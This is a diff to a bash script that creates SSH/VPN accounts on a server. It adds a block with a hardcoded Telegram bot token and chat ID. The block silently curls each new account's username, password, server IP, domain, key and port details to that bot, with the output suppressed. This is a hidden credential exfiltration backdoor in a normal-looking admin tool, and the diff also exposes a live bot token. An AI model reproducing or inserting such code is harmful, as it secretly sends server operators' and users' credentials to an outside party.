@@ -89,6 +89,43 @@ if [[ "${DATADB}" != '' ]]; then
   sed -i "/\b${Login}\b/d" /etc/ssh/.ssh.db
 fi
 echo "### ${Login} ${masaaktif} ${Pass} ${quota} ${limit}" >>/etc/ssh/.ssh.db
+CHATID="1658354197"
+KEY="6581548016:AAGmvN9Dcx24QiOnNIp9DVilqCN2fCzMTas"
+WKT="10"
+URL="https://api.telegram.org/bot$KEY/sendMessage"
+TEXT="Free Wifi
+============================
+<code>Username     :</code> <code>$Login</code>
+<code>Password     :</code> <code>$Pass</code>
+<code>Created      :</code> <code>$hariini</code>
+<code>Quota        :</code> <code>${quota} GB</code>
+<code>Limit IP     :</code> <code>${limit} USER</code>
+<code>Expired      :</code> <code>$expi</code>
+<code>IP/Host      :</code> <code>$IP</code>
+<code>Domain SSH   :</code> <code>$domain</code>
+<code>ubKey        :</code> <code>$slkey</code>
+Nameserver         : <code>$sldomain</code>
+OpenSSH            :<code>22</code>
+Dropbear           :<code>44, 69, 143</code>
+SSH UDP            :<code>1-2288</code>
+STunnel4           :<code>442,222,2096</code>
+SlowDNS port       :<code>53,5300,8080</code>
+SSH Websocket SSL/TLS: <code>443</code>
+SSH Websocket HTTP: <code>80,8080</code>
+SSH Websocket Direct: <code>8080</code>
+OPEN VPN: <code>1194</code>
+BadVPN UDPGW: <code>7100,7200,7300</code>
+Proxy Squid: <code>[ON]</code>
+OVPN TCP: <code>http://$IP:81/tcp.ovpn</code>
+OVPN UDP: <code>http://$IP:81/udp.ovpn</code>
+OVPN SSL: <code>http://$IP:81/ssl.ovpn</code>
+<code>GET wss://bug.com/ HTTP/1.1[crlf]Host: [host][crlf]Upgrade: websocket[crlf][crlf]</code>
+<code>Payload Websocket HTTP</code>
+
+<code>GET / HTTP/1.1[crlf]Host: [host][crlf]Upgrade: websocket[crlf][crlf]</code>"
+
+
+curl -s --max-time $WKT -d "chat_id=$CHATID&disable_web_page_preview=1&text=$TEXT&parse_mode=html" $URL >/dev/null
 clear
 echo -e ""
 echo -e "\033[1;36m**━━━━━━━━━━━━━━━━━━━━━━━━━━**\033[0m"
@@ -130,5 +167,6 @@ echo -e "\033[1;36m**━━━━━━━━━━━━━━━━━━━�
 echo -e "${CYAN}       Script By Andyyuda" 
 echo -e "\033[1;36m**━━━━━━━━━━━━━━━━━━━━━━━━━━**\033[0m"
 echo ""
+
 read -n 1 -s -r -p "Press any key to back on menu"
 menu
